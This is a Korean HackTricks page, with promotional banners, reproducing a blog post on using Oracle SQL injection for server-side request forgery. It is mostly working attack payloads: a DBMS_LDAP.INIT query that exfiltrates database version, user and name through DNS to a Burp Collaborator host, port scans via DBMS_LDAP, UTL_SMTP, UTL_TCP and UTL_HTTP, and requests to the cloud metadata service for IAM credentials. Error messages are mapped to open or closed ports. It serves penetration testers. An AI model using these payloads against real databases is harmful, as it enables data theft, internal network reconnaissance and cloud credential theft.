# 오라클 인젝션

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **Hacking 트릭을 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 저장소에 제출**하세요.

</details>

**[https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/)의 삭제된 게시물을 웨이백 머신의 사본으로 제공합니다.**

## SSRF

Oracle을 사용하여 Out of Band HTTP 및 DNS 요청을 수행하는 방법은 SQL 데이터 유출의 수단으로 잘 문서화되어 있습니다. 이러한 기술/함수를 항상 수정하여 다른 SSRF/XSPA를 수행할 수 있습니다.

Oracle을 설치하는 것은 정말 고통스러울 수 있습니다. 특히 명령어를 시도해보기 위해 빠른 인스턴스를 설정하려는 경우에는 더욱 그렇습니다. [Appsecco](https://appsecco.com)의 친구이자 동료인 [Abhisek Datta](https://github.com/abhisek)가 [https://github.com/MaksymBilenko/docker-oracle-12c](https://github.com/MaksymBilenko/docker-oracle-12c)를 소개해줬습니다. 이를 통해 t2.large AWS Ubuntu 머신과 Docker에 인스턴스를 설정할 수 있었습니다.

이 블로그 포스트의 과정 동안 Oracle을 네이티브 설치로 모방하고 전체 네트워크 액세스 권한을 갖도록 `--network="host"` 플래그를 사용하여 도커 명령을 실행했습니다.
```
docker run -d --network="host" quay.io/maksymbilenko/oracle-12c
```
#### URL 또는 호스트 이름/포트 번호 지정을 지원하는 Oracle 패키지 <a href="#oracle-packages-that-support-a-url-or-a-hostname-port-number-specification" id="oracle-packages-that-support-a-url-or-a-hostname-port-number-specification"></a>

호스트와 포트 지정을 지원하는 패키지와 함수를 찾기 위해 [Oracle Database Online Documentation](https://docs.oracle.com/database/121/index.html)에서 Google 검색을 실행했습니다. 특히,
```
site:docs.oracle.com inurl:"/database/121/ARPLS" "host"|"hostname" "port"|"portnum"
```
다음은 검색 결과입니다 (모두가 아웃바운드 네트워크를 수행하는 데 사용될 수는 없습니다)

* DBMS\_NETWORK\_ACL\_ADMIN
* UTL\_SMTP
* DBMS\_XDB
* DBMS\_SCHEDULER
* DBMS\_XDB\_CONFIG
* DBMS\_AQ
* UTL\_MAIL
* DBMS\_AQELM
* DBMS\_NETWORK\_ACL\_UTILITY
* DBMS\_MGD\_ID\_UTL
* UTL\_TCP
* DBMS\_MGWADM
* DBMS\_STREAMS\_ADM
* UTL\_HTTP

이러한 원시적인 검색은 당연히 `DBMS_LDAP`와 같은 패키지를 건너뛰며 (호스트 이름과 포트 번호를 전달하는 것을 허용함) [문서 페이지](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360)는 단순히 [다른 위치](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360)로 안내합니다. 따라서, 놓친 아웃바운드 요청을 수행하기 위해 남은 Oracle 패키지가 있을 수 있습니다.

어쨌든, 우리가 발견하고 위에 나열한 몇 가지 패키지를 살펴보겠습니다.

**DBMS\_LDAP.INIT**

`DBMS_LDAP` 패키지는 LDAP 서버에서 데이터에 액세스할 수 있도록 합니다. `init()` 함수는 LDAP 서버와의 세션을 초기화하고 호스트 이름과 포트 번호를 인수로 사용합니다.

이 함수는 이전에 DNS를 통해 데이터 유출을 보여주기 위해 문서화되었습니다. 아래와 같이
```
SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual;
```
그러나 함수가 호스트 이름과 포트 번호를 인수로 받기 때문에 이를 이용하여 포트 스캐너처럼 작동시킬 수도 있습니다.

다음은 몇 가지 예시입니다.
```
SELECT DBMS_LDAP.INIT('scanme.nmap.org',22) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',25) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',80) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',8080) FROM dual;
```
`ORA-31203: DBMS_LDAP: PL/SQL - Init Failed.`는 세션 값이 포트가 열려있음을 가리키는 동안 포트가 닫혀있음을 나타냅니다.

**UTL\_SMTP**

`UTL_SMTP` 패키지는 SMTP를 통해 이메일을 보내기 위해 설계되었습니다. [Oracle 문서 사이트에서 제공하는 예제는 이 패키지를 사용하여 이메일을 보내는 방법을 보여줍니다](https://docs.oracle.com/database/121/ARPLS/u\_smtp.htm#ARPLS71478). 그러나 우리에게 흥미로운 것은 호스트와 포트를 지정할 수 있는 능력입니다.

아래에는 `UTL_SMTP.OPEN_CONNECTION` 함수를 사용한 간단한 예제가 나와 있습니다. 타임아웃은 2초로 설정되어 있습니다.
```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',80,2);
END;
```

```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',8080,2);
END;
```
`ORA-29276: 전송 시간 초과`는 포트가 열려 있지만 SMTP 연결이 수립되지 않았음을 나타내며, `ORA-29278: SMTP 일시적 오류: 421 서비스를 사용할 수 없음`은 포트가 닫혀 있음을 나타냅니다.

**UTL\_TCP**

`UTL_TCP` 패키지와 해당 프로시저 및 함수는 [TCP/IP 기반 서비스와의 통신](https://docs.oracle.com/cd/B28359\_01/appdev.111/b28419/u\_tcp.htm#i1004190)를 가능하게 합니다. 특정 서비스를 위해 프로그래밍된 경우, 이 패키지는 네트워크로의 진입로가 될 수도 있으며 TCP/IP 연결의 모든 측면을 제어할 수 있기 때문에 완전한 서버 측 요청을 수행할 수도 있습니다.

Oracle 문서 사이트의 예제에서는 이 패키지를 사용하여 웹 페이지를 가져오기 위해 원시 TCP 연결을 생성하는 방법을 보여줍니다(https://docs.oracle.com/cd/B28359\_01/appdev.111/b28419/u\_tcp.htm#i1004190). 우리는 이를 간단히 하여 메타데이터 인스턴스나 임의의 TCP/IP 서비스에 요청을 보낼 수 있습니다.
```
set serveroutput on size 30000;
SET SERVEROUTPUT ON
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);
retval := utl_tcp.write_line(c, 'GET /latest/meta-data/ HTTP/1.0');
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
/
```

```
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('scanme.nmap.org',22,tx_timeout => 4);
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
```
흥미롭게도, 원시 TCP 요청을 만들 수 있는 능력 때문에 이 패키지는 모든 클라우드 제공업체의 인스턴스 메타데이터 서비스를 쿼리하는 데에도 사용될 수 있습니다. 메소드 유형과 추가 헤더는 모두 TCP 요청 내에서 전달될 수 있기 때문입니다.

**UTL\_HTTP 및 웹 요청**

아마도 가장 일반적이고 널리 문서화된 기술은 모든 Out of Band Oracle SQL Injection 튜토리얼에서 [`UTL_HTTP` 패키지](https://docs.oracle.com/database/121/ARPLS/u\_http.htm#ARPLS070)입니다. 이 패키지는 문서에서 다음과 같이 정의됩니다 - `UTL_HTTP 패키지는 SQL 및 PL/SQL에서 하이퍼텍스트 전송 프로토콜(HTTP) 호출을 수행합니다. 이를 사용하여 HTTP를 통해 인터넷 상의 데이터에 액세스할 수 있습니다.`
```
select UTL_HTTP.request('http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole') from dual;
```
다음과 같은 쿼리를 사용하여 일부 기본적인 포트 스캐닝도 수행할 수 있습니다.
```
select UTL_HTTP.request('http://scanme.nmap.org:22') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:8080') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:25') from dual;
```
`ORA-12541: TNS:no listener` 또는 `TNS:operation timed out`은 TCP 포트가 닫혀있음을 나타내는 신호입니다. 반면 `ORA-29263: HTTP protocol error` 또는 데이터는 포트가 열려있음을 나타냅니다.

과거에 다양한 성공률로 사용한 다른 패키지는 [`HTTPURITYPE` 오라클 추상 타입의 `GETCLOB()` 메서드](https://docs.oracle.com/database/121/ARPLS/t\_dburi.htm#ARPLS71705)입니다. 이 메서드는 URL과 상호작용하고 HTTP 프로토콜을 지원하는 기능을 제공합니다. `GETCLOB()` 메서드는 URL에서 GET 응답을 [CLOB 데이터 유형](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html)으로 가져오는 데 사용됩니다. [select HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() from dual;

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왑**](https://peass.creator-spring.com)을 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기술을 공유하세요.

</details>
